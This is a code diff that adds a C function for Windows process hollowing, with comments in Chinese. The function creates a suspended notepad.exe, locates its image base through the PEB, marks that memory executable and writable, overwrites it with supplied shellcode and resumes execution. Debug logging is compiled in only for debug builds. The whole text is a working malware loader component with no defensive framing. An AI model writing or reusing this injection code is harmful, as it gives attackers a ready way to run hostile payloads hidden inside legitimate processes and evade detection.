@@ -1,0 +1,112 @@
+// 进程空洞注入加载方式：创建挂起进程并替换其内存空间
+void ExecuteProcessHollowing(PBYTE shellcode, SIZE_T shellcodeSize) {
+#ifdef _DEBUG
+    printf("[*] 进程空洞注入方式执行Shellcode\n");
+#endif
+    
+    // 启动信息
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi = {0};
+    
+    // 创建挂起进程（notepad.exe）
+    if (!CreateProcessA(
+        "C:\\Windows\\System32\\notepad.exe",
+        NULL,
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_SUSPENDED,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    )) {
+#ifdef _DEBUG
+        printf("[!] 创建挂起进程失败: %d\n", GetLastError());
+#endif
+        return;
+    }
+    
+#ifdef _DEBUG
+    printf("[*] 目标进程创建成功，PID: %d\n", pi.dwProcessId);
+#endif
+    
+    // 获取目标进程PEB地址
+    PROCESS_BASIC_INFORMATION pbi = {0};
+    DWORD returnLength = 0;
+    
+    typedef NTSTATUS (WINAPI *PFN_NTQUERYINFORMATIONPROCESS)(
+        HANDLE ProcessHandle,
+        DWORD ProcessInformationClass,
+        PVOID ProcessInformation,
+        DWORD ProcessInformationLength,
+        PDWORD ReturnLength
+    );
+    
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    PFN_NTQUERYINFORMATIONPROCESS pNtQueryInformationProcess = 
+        (PFN_NTQUERYINFORMATIONPROCESS)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+    
+    if (pNtQueryInformationProcess &&
+        pNtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLength) == 0) {
+        
+        // 读取PEB
+        PPEB pPeb = (PPEB)pbi.PebBaseAddress;
+        SIZE_T bytesRead = 0;
+        PEB localPeb = {0};
+        
+        if (ReadProcessMemory(pi.hProcess, pPeb, &localPeb, sizeof(localPeb), &bytesRead)) {
+            // 获取镜像基址（使用指针偏移访问PEB字段，避免结构体兼容性问题）
+            // PEB.ImageBaseAddress位于偏移0x10（x64）或0x08（x86）
+            LPVOID imageBase;
+            #ifdef _WIN64
+            imageBase = *(LPVOID*)((BYTE*)&localPeb + 0x10);
+            #else
+            imageBase = *(LPVOID*)((BYTE*)&localPeb + 0x08);
+            #endif
+            
+#ifdef _DEBUG
+            printf("[*] 目标进程镜像基址: %p\n", imageBase);
+#endif
+            
+            // 读取PE头
+            BYTE dosHeader[64] = {0};
+            if (ReadProcessMemory(pi.hProcess, imageBase, dosHeader, sizeof(dosHeader), &bytesRead)) {
+                PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)dosHeader;
+                PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)imageBase + pDosHeader->e_lfanew);
+                
+                // 取消内存保护
+                DWORD oldProtect;
+                VirtualProtectEx(pi.hProcess, imageBase, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect);
+                
+                // 写入Shellcode
+                if (WriteProcessMemory(pi.hProcess, imageBase, shellcode, shellcodeSize, NULL)) {
+#ifdef _DEBUG
+                    printf("[*] Shellcode写入成功\n");
+#endif
+                    
+                    // 恢复线程执行
+                    ResumeThread(pi.hThread);
+                    
+#ifdef _DEBUG
+                    printf("[*] 进程空洞注入完成\n");
+#endif
+                } else {
+#ifdef _DEBUG
+                    printf("[!] 写入Shellcode失败: %d\n", GetLastError());
+#endif
+                    TerminateProcess(pi.hProcess, 0);
+                }
+            }
+        }
+    } else {
+#ifdef _DEBUG
+        printf("[!] 查询进程信息失败\n");
+#endif
+        TerminateProcess(pi.hProcess, 0);
+    }
+    
+    // 清理
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+}
